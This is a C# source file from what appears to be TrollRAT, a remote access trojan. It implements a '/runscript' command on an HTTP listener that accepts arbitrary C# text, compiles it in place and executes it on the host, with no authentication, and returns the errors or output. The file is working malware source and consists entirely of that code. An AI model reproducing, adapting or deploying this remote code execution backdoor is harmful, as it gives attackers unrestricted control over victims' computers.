using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;

namespace TrollRAT.Server.Commands
{
    public class RunScriptCommand : WebServerCommandBase
    {
        public override Regex Path => new Regex("^/runscript$");

        public override void execute(HttpListenerContext context)
        {
            var content = new StreamReader(context.Request.InputStream).ReadToEnd();
            var code = new StringBuilder();

            Regex regex = new Regex("using (.+?);");

            foreach (Match match in regex.Matches(content))
            {
                code.AppendLine(match.Value);
            }

            content = regex.Replace(content, "");

            code.AppendLine("namespace TrollRAT {");
            code.AppendLine("public static class Main {");
            code.AppendLine("public static void main() {");
            code.AppendLine(content);
            code.AppendLine("}}}");

            var provider = new CSharpCodeProvider();
            var parameters = new CompilerParameters();

            parameters.ReferencedAssemblies.AddRange(
                AppDomain.CurrentDomain.GetAssemblies().Where(a => !a.IsDynamic).Select(a => a.Location).ToArray());

            parameters.GenerateInMemory = false;
            parameters.GenerateExecutable = false;

            var result = provider.CompileAssemblyFromSource(parameters, code.ToString());

            var message = new StringBuilder();
            
            foreach (CompilerError error in result.Errors)
            {
                message.AppendLine(String.Format("Error {0}: {1}", error.ErrorNumber, error.ErrorText));
            }

            if (result.Errors.Count == 0)
            {
                var asm = Assembly.LoadFrom(result.PathToAssembly);

                var mainClass = asm.GetType("TrollRAT.Main");
                var main = mainClass.GetMethod("main");

                try
                {
                    main.Invoke(null, null);
                } catch (TargetInvocationException ex)
                {
                    message.Append("Exception while running script:\n\n" + ex.InnerException.Message);
                }
                
            }

            if (message.Length == 0)
                message.AppendLine("Script seems to have been executed without errors.");

            respondString(message.ToString(), context.Response, "text/html");
        }
    }
}
